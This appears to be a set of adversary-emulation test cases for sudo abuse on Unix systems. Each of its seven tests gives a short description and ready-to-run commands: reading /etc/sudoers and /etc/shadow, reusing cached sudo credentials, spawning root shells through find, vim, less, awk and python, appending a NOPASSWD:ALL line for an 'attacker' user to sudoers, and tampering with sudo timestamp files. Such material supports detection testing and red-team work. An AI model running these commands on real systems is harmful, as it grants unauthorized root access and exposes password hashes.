### Test 1: Sudo Enumeration
**Description:** List sudo privileges for the current user
```sh
sudo -l
```

### Test 2: Sudo Configuration File Access
**Description:** Read sudo configuration file to identify privilege escalation opportunities
```sh
sudo cat /etc/sudoers
cat /etc/sudoers.d/*
```

### Test 3: Sudo Caching Exploitation
**Description:** Exploit sudo credential caching (default 15 minutes)
```sh
# First, authenticate with sudo
sudo whoami

# Within the timeout period (default 15 min), run privileged commands without re-authentication
sudo cat /etc/shadow
sudo bash
```

### Test 4: Sudo with NOPASSWD Abuse
**Description:** Execute commands via sudo entries that don't require password
```sh
# If sudoers has NOPASSWD entries, exploit them
sudo -u root /usr/bin/find /etc -exec /bin/sh \;
sudo -u root /usr/bin/vim -c ':!/bin/sh'
```

### Test 5: Sudoers File Modification
**Description:** Modify sudoers file to grant unauthorized privileges (requires write access)
```sh
# Add user to sudoers with ALL privileges
echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Or use visudo (safer method)
sudo visudo
```

### Test 6: Sudo Token Manipulation  
**Description:** Attempt to manipulate sudo timestamp files
```sh
# Check timestamp directory
ls -la /var/db/sudo/lectured
ls -la /var/run/sudo/ts

# Attempt to extend sudo session
touch /var/db/sudo/$(whoami)
```

### Test 7: Sudo Binary Exploitation
**Description:** Execute shell through sudo-allowed binaries
```sh
# Common sudo-exploitable binaries
sudo /usr/bin/less /etc/profile
# In less, type: !sh

sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/find /etc -exec /bin/sh \; -quit
sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
```
